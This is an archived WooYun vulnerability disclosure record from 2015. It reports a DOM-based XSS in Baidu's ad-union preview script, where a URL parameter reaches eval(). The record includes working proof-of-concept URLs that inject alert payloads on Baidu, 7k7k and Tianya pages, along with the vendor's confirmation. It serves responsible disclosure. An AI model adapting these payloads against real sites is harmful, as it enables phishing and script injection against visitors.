{"id": 44722, "wybug_id": "wooyun-2015-098803", "wybug_title": "百度联盟代码缺陷导致使用百度推广的网站存在DOM XSS II", "wybug_corp": "百度", "wybug_author": "jsbug", "wybug_date": "2015-03-02 11:54", "wybug_open_date": "2015-04-16 11:56", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-16：\t细节向公众公开  简要描述： 闪电果然是看脸的。 详细说明：  还是上次的代码,仅仅修补了JSON。接着往下走。\nhttp://news.7k7k.com/gf/?bd_cpro_prev={\"selectScale\":10010,\"showUrl\":\"http://wm.baidu.com\",\"src\":\"\",\"type\":2,\"title\":\"\",\"isUpload\":\"0\",\"imgWidth\":\"960\",\"imgHeight\":\"60\",\"imgUrl\":\"http://cpro.baidu.com/cpro/ui/preview/default_img_unit/fix/960x60.jpg\",\"image\":[10009,10007,10010,10013,10006,10015,10014],\"tip\":0,\"linkUrl\":\"http://wm.baidu.com\",\"imgTitle\":\"\",\"des1\":\"\",\"des2\":\"\"}\n会载入框架image.html\n\n上次说能自己修改图片看怎么处理的。\nwindow.onload = function () {    var a = 'bd_cpro_prev';    var f = baidu.url.parseQuery(window.location.href.replace(/%252e/g, '%2e'), a).replace(/^#/, '');    var b = e(f);    d(b);    if (b.tip == 1) {        c()    }    function e(i) {        var g = decodeURIComponent(i);        var h = g.replace(/\\\\x1e/g, '&').replace(/\\\\x1d/g, '=').replace(/\\\\x1c/, '?').replace(/\\\\x5c/, '\\\\').replace(/\\\\x/g, '');        return baidu.json.decode(h)    }\nlocation.href里还是处理bd_cpro_prev,没有任何过滤，还帮解码一些字符，然后baidu.json.decode\nbaidu.json.decode = function (string) {    return eval('(' + string + ')')};\n然后就没有然后了。http://cpro.baidu.com/cpro/ui/preview/templates/image.html?bd_cpro_prev=alert(1)\n\n值得庆幸的是，这次是baidu域下的XSS，不会影响到当前站，拿来钓钓鱼什么的还行。   漏洞证明：  直接给代码，还是以天涯和7K7K为例：\nhttp://news.7k7k.com/rxjlp/?bd_cpro_prev={\"selectScale\":10010,\"showUrl\":\"http://wm.baidu.com\",\"src\":\"\",\"type\":2,\"title\":\"\",\"isUpload\":\"0\",\"imgWidth\":\"960\",\"imgHeight\":\"60\",\"imgUrl\":\"http://zone.wooyun.org/themes/wooyun/images/logo.png\\x5c\" onload=alert(document.domain)//\",\"image\":[10009,10007,10010,10013,10006,10015,10014],\"tip\":0,\"linkUrl\":\"http://wm.baidu.com\",\"imgTitle\":\"\",\"des1\":\"\",\"des2\":\"\"}\n\n\n\nhttp://bbs.tianya.cn/post-funinfo-6201480-1.shtml?bd_cpro_prev={\"selectScale\":10009,\"showUrl\":\"http://wm.baidu.com\",\"src\":\"\",\"type\":2,\"title\":\"\",\"isUpload\":\"0\",\"imgWidth\":\"960\",\"imgHeight\":\"90\",\"imgUrl\":\"http://zone.wooyun.org/themes/wooyun/images/logo.png\\x5c\" onload=alert(document.domain)//\",\"image\":[10009,10013,10015],\"tip\":0,\"linkUrl\":\"http://wm.baidu.com\",\"imgTitle\":\"\",\"des1\":\"\",\"des2\":\"\"}\n\n\n   修复方案：  不说你也知道。   版权声明：转载请注明来源 jsbug@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-03-02 21:23 厂商回复： 感谢提交，已通知业务部门处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}